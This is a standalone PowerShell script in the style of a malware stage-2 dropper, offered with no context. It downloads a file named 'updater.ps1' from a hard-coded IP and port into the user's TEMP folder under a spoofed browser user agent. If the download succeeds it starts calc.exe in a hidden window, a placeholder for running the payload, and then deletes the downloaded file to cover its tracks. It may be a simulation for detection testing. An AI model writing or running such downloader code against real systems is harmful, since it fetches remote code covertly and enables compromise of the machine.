$PayloadUrl = 'https://198.51.100.184:8443/updater.ps1'
$OutputPath = "$env:TEMP\stage2.bin"
$RequestTimeout = 166
$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Get-Stage2Payload -SourceUrl $PayloadUrl -DestinationPath $OutputPath -TimeoutSec $RequestTimeout -UserAgent $BrowserAgent
if ($TransferResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
